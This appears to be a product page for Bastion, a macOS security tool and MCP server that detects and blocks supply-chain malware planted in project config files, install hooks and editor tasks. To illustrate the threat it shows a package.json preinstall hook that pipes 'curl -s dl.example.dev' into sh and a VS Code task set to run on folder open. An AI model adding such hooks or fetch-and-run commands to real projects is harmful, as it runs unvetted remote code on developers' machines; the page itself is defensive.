The attack

Malware now hides in files you run without reading

Attackers slip a payload into ordinary project files and wait for you to run a normal command. Once it runs, it quietly steals your tokens, browser sessions and saved passwords, then phones home.

postcss.config.mjs

1export default { 2 plugins: { tailwindcss: {} }, 3};payload at col 2,431

Runs on npm run devbuildtest

Build tools execute their config files. The payload sits after the real config, pushed past the edge of your editor.

package.json

1"scripts": { 2 "dev": "vite", 3 "preinstall": 4 "curl -s dl.example.dev | sh" 5}

Runs on npm install

An install hook downloads and runs code the moment you install. The same trick hides in dependencies, deep in node_modules.

.vscode/tasks.json

1{ 2 "label": "prepare", 3 "command": "node init.js", 4 "runOptions": { 5 "runOn": "folderOpen" 6 } 7}

Runs on opening the folder

An auto-run editor task fires as soon as the folder opens in VS Code or Cursor. No command needed.

How it works

Four layers between a payload and your Mac

Each layer works on its own. Together they stop the attack at the door, catch it if it runs, clean up after it and sweep for anything left behind.

  1. 1.0

    Prevent

    Command guards refuse to run dev, build or install in a tampered project. A git hook blocks pushing an infected config.

  2. 2.0

    Detect & stop

    A watcher checks every ~12 seconds, kills malware loaders and connections to known attacker servers, and quarantines what they leave behind.

    2.1Watcher2.2Quarantine

  3. 3.0

    Respond

    The responder investigates, contains what it can prove and writes the incident report.

  4. 4.0

    Scan

    A structural scan of config files, source files, install hooks, editor tasks, dependencies, CI workflows and every branch. On demand, at login and every few hours.

It works the incident like a security engineer would

Which commit brought the payload in, and who committed it. Whether it ever ran. Which branches carry it. What else that identity touched. Then it fixes what it can prove and hands you a short to-do list for the rest.

  1. 3.1

    Investigate

    A fresh scan, then git history for every infected file: the last clean version, the commit and identity that planted the payload, and every branch that carries it. It checks whether the payload ever ran.

  2. 3.2

    Only steps it can prove and undo. It removes injected code when the file then matches its last clean commit byte for byte, stops loaders, quarantines leftovers and blocks addresses found in the payload.

  4. 3.4

The guards

Every way in has a guard

A payload can arrive through a dev server, an install, a pull request or an old branch. Bastion checks each one before it can run.

🛡 Bastion — prevented execution now

Blocked npm: injected config in ~/code/storefront/postcss.config.mjs

~/code/storefront $ npm run dev

🛡 Bastion blocked 'npm run dev' — injected config: ~/code/storefront/postcss.config.mjs

Clean the file before running (git checkout from a trusted branch, or fix by hand).

Team PR guard

A GitHub Action fails any pull request that carries a payload. False alarms are ignored from the base branch, so a pull request can’t silence its own findings.

History hunt

A clean working tree doesn’t mean a clean repo. Bastion searches every commit on every branch, the reflog and objects left over from deleted branches, and names the commit and identity that planted the payload.

Bastion is an MCP server. Agents ask it whether a repository is safe before they run install, dev, build or test, and hand anything suspicious to the responder.

Connect your agent

Run this once:

claude mcp add --scope user bastion -- ~/.security-guard/bin/bastion mcp

Add Bastion to the app’s mcpServers. For Cursor that’s ~/.cursor/mcp.json. Use your full home path.

{
  "mcpServers": {
    "bastion": {
      "command": "/Users/you/.security-guard/bin/bastion",
      "args": ["mcp"]
    }
  }
}

In ~/.codex/config.toml:

[mcp_servers.bastion]
command = "/Users/you/.security-guard/bin/bastion"
args = ["mcp"]

What agents can do

  • bastion_check_pathIs it safe to run npm here? Usually answers in under a second.
  • bastion_respondInvestigates, contains what it can prove, with undo, and returns an incident report.
  • bastion_depsChecks a project’s dependencies.
  • bastion_historyHunts a repo’s git history for planted payloads.
  • bastion_enableTurns a protection on. There is no tool to turn one off.

1.5

Hard-guard, for when an agent skips the check

A hook runs before every shell command the agent starts, and blocks install, dev, build or test in a project that isn’t safe. The agent is told why and what to do instead.

$ npm install

Bastion blocked this command: ~/code/storefront is not safe to run.

• Injected build config — ~/code/storefront/postcss.config.mjs

Don’t run install, dev, build or test here. Tell the user, and suggest bastion respond ~/code/storefront to investigate and contain it.

bastion hooks install claude    # or cursor, or all

Your settings are kept, with a backup next to the file. The hook never approves anything on its own.

Agents can make you safer, never less safe

There’s no tool to switch protection off, trust a host, ignore a path, unblock an address or restore quarantined files. A confused or tricked agent can’t do those things either. They stay with you, and every change is logged and announced.

Command line

Scriptable down to the exit code

Every check is one command, and --json gives you machine-readable output. So bastion check && npm install works in scripts and CI.

cd ~/code/storefront && bastion check

fix: Don’t run install/dev/build/test in this repo. git log -p -- postcss.config.mjs shows who changed the file.

Principles

Careful by default

A security tool runs with your permissions. Bastion is built to deserve them.

Runs on your Mac

Nothing is uploaded, unless you turn on the online malware check. That sends package names and versions only.

Catches new variants

It spots the shape of the trick rather than one exact virus, so new versions of an attack get caught too.

Never destructive

Nothing is deleted. Leftovers are quarantined and every file change has an undo: bastion undo.

Doesn’t cry wolf

An allowlist for your own servers and an ignore list for docs and tests keep false alarms away.

Loud about lowering protection

Only you can turn a protection off, trust a host or restore a quarantined file. Every change is logged and announced.

⌘K

Keyboard-first app

A menu-bar panel for a quick look and a full window for everything else. ⌘K opens the command menu and ⌘1–7 jump between pages.

Honest limits

Bastion is a focused guard. Here’s what it doesn’t do.

It isn’t a full antivirus

It targets this family of supply-chain attacks and the mess they leave. Keep a general scanner around too.

Brand-new packages can slip through

A new package that hides its payload in ordinary library code can still get in. npm install --ignore-scripts is the belt-and-braces option.

It protects your machine

If malicious code keeps arriving in a shared repo, fix it at the source. The incident’s to-dos show you where.

Agents run with your permissions

An agent that can run shell commands could, in principle, remove Bastion itself. Bastion makes lowering protection explicit and loud rather than impossible.
